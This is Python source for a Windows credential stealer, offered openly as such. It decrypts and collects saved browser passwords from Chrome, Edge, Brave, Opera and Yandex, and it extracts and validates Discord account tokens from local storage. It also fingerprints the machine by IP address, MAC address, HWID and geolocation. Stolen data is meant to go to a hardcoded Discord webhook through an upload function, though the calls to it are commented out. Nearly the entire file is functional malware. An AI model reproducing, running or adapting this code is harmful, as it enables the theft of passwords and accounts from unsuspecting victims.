
import subprocess
import sys

required_modules = ["requests", "pycryptodome"]

for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

hook='https://canary.discord.com/api/webhooks/1323223226716786738/VtSunsRbDdhbfFBaE7xTaFmvfDh-cfXgzRmgKZKJFKMGag80XX-Wr8dGkwH7LjndwUFW'

import os, threading, random, shutil, json, base64, requests, re, subprocess, uuid
from Crypto.Cipher import AES
from sqlite3       import connect   as sql_connect
from base64        import b64decode
from json          import loads     as json_loads, load
from ctypes        import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

class data_structure(Structure):
    _fields_ = [
        ('cbData',wintypes.DWORD),
        ('pbData',POINTER(c_char))
    ]

local_folder   = os.getenv('LOCALAPPDATA')
roaming_folder = os.getenv('APPDATA')
temp_folder    = os.getenv("TEMP")

browser_paths = [
        [f"{roaming_folder}/Opera Software/Opera Stable",                 "opera.exe",  "/Local Storage/leveldb",    "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
        [f"{roaming_folder}/Opera Software/Opera Neon/User Data/Default", "opera.exe",  "/Local Storage/leveldb",    "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
        [f"{local_folder}/Google/Chrome/User Data",                       "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
        [f"{local_folder}/Google/Chrome SxS/User Data",                   "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
        [f"{local_folder}/BraveSoftware/Brave-Browser/User Data",         "brave.exe",  "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
        [f"{local_folder}/Yandex/YandexBrowser/User Data",                "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],
        [f"{local_folder}/Microsoft/Edge/User Data",                      "edge.exe",   "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]
]

discord_paths = [
        [f"{roaming_folder}/Discord",       "/Local Storage/leveldb"],
        [f"{roaming_folder}/Lightcord",     "/Local Storage/leveldb"],
        [f"{roaming_folder}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming_folder}/discordptb",    "/Local Storage/leveldb"],
]

buffer_data_structure = (lambda u: (
    c:=int(u.cbData),
    p:=u.pbData,
    b:=c_buffer(c),

    cdll.msvcrt.memcpy(b, p, c),
    windll.kernel32.LocalFree(p),
    b.raw
)[-1])

crypt_unprotected_data = (lambda e, n=b'': (
    lambda b=data_structure(): buffer_data_structure(b)
    if windll.crypt32.CryptUnprotectData(byref(data_structure(len(e), c_buffer(e, len(e)))), None, byref(data_structure(len(n), c_buffer(n, len(n)))), None, None, 0x01, byref(b))
    else None
)())

decrypt_value = (lambda buff, master_key=None: (
    lambda starts  = buff.decode('utf8', 'ignore')[:3],
           iv      = buff[3:15],
           payload = buff[15:],
           cipher  = AES.new(master_key, AES.MODE_GCM, buff[3:15]
    ):
    cipher.decrypt(payload)[:-16].decode()
    if starts in {'v10', 'v11'} else None
)())

def aaa(webhook_url, content, filename="message.txt"):
    with open(filename, "w") as file:
        file.write(content)
    with open(filename, "rb") as file:
        files = {
            "file": (filename, file)
        }
        response = requests.post(webhook_url, files=files)

def send_text_file_to_webhook(webhook_url, content, filename="message.txt"):
    if content != None:
        print(content)

def steal_passwords_from_path(p, arg):
    try:
        return (g:=(urls:=[],usernames:=[],passwords:=[],[f:=temp_folder+"cr"+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+".db",shutil.copy2(p+arg+"/Login Data",f),c:=sql_connect(f),k:=c.cursor(),k.execute("SELECT action_url, username_value, password_value FROM logins;"),d:=k.fetchall(),k.close(),c.close(),os.remove(f)],[[urls.append(row[0]),usernames.append(row[1]),passwords.append(decrypt_value(row[2], crypt_unprotected_data(__import__('base64').b64decode(__import__('json').loads(open(p+"/Local State",'r',encoding='utf-8').read())['os_crypt']['encrypted_key'])[5:])))]if row[0]!=''else None for row in d],([(f"{urls[_]}|#####|{usernames[_]}|#####|{passwords[_]}")for _ in range(len(urls))]))[-1],([_ if (os.path.exists(p) and os.stat(p+arg+"/Login Data").st_size != 0)else''for _ in[g]][-1]))[-1]
    except Exception as e:
        eval('0')

def steal_tokens_from_path(path, arg):
    tokens = []
    if not os.path.exists(f"{path}/Local State"): return
    [[a:=[(decoded_token:=decrypt_value(b64decode(e_token.split('dQw4w9WgXcQ:')[1]),crypt_unprotected_data(b64decode(json.loads(open(path+"/Local State", 'r', encoding='utf-8').read())['os_crypt']['encrypted_key'])[5:])),valid:=requests.get("https://discord.com/api/v10/users/@me",headers={"Authorization":decoded_token}).ok,token:=[tokens.append(decoded_token)if _ else''for _ in[valid]])for e_token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",line)]for line in[x.strip()for x in open(f"{path + arg}\\{file}",errors="ignore").readlines()if x.strip()]] if file.endswith('.log') or file.endswith('.ldb') else None for file in os.listdir(path + arg)]
    if len(tokens) >= 1:return '\n'.join(list(set(tokens)))

def get_ip():
    ip = requests.get('https://api.ipify.org').text
    out = []

    ip_information = __import__('requests').get(f'https://extreme-ip-lookup.com/json/{ip}?key=Qn97RtiI2gwjStzJJjuG').json()
    hwid = max((line.split()[-1] for line in subprocess.check_output(['reg', 'query', r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], universal_newlines=True).splitlines() if "MachineGuid" in line), key=len, default="HWID not found")

    out.append('ip        : ' + ip)
    out.append('mac addr  : ' + ':'.join(['{:02x}'.format((uuid.getnode()>>i)&0xff)for i in range(0,48,8)][::-1]))
    out.append('hwid      : ' + hwid)
    out.append('')
    out.append('continent : ' + ip_information['continent'])
    out.append('country   : ' + ip_information['country'] + ' (' + ip_information['countryCode'] + ')')
    out.append('region    : ' + ip_information['city'] + ', ' + ip_information['region'])
    out.append('')
    out.append('coords    : ' + ip_information['lon'] + '°N, ' + ip_information['lat'] + '°W')
    out.append('timezone  : ' + ip_information['timezone'] + ' (UTC' + ip_information['utcOffset'] + ')')
    out.append('')
    out.append('ip type   : ' + ip_information['ipType'])
    out.append('ip name   : ' + ip_information['ipName'])
    out.append('asn       : ' + ip_information['asnOrg'])
    out.append('            ' + ip_information['asnName'] + ' (' + ip_information['asn'] + ')')

    return '\n'.join(out)


def parse_url(url):
    parsed = url.split('/')
    parsed[0] = parsed[0] + '/'
    parsed.pop(1)

    base_url = '/'.join([parsed[0],parsed[1]])

    parsed.pop(0)
    parsed.pop(0)

    return base_url, '/'.join(['']+parsed)

def parse_password_table(table):
    password_dictionary = {}

    for _ in table:
        website  = _.split('|#####|')[0]
        username = _.split('|#####|')[1]
        password = _.split('|#####|')[2]

        if 'http' in website:
            base_url, extension = parse_url(website)

            if base_url not in password_dictionary.keys():
                password_dictionary[base_url]=[]

            if base_url in password_dictionary.keys():
                password_dictionary[base_url].append({'extension':extension,'username':username,'password':password})

    return password_dictionary

def steal_passwords_from_browsers():
    all_browser_passwords = []

    for patt in browser_paths:
        if str(steal_passwords_from_path(patt[0], patt[3])) not in ['', 'None', '[]']:
            password_data=steal_passwords_from_path(patt[0], patt[3])
            all_browser_passwords.append(parse_password_table(password_data))
            #send_text_file_to_webhook(hook,password_data,patt[1].replace('exe','txt'))

    return all_browser_passwords

def steal_tokens_from_discords():
    all_tokens = []

    for _ in discord_paths:
        if steal_tokens_from_path(_[0], _[1]) != None:
            all_tokens.append(steal_tokens_from_path(_[0], _[1]))

    #return all_tokens
    return all_tokens
    #send_text_file_to_webhook(hook, steal_tokens_from_path(_[0], _[1]),'tokens.txt')
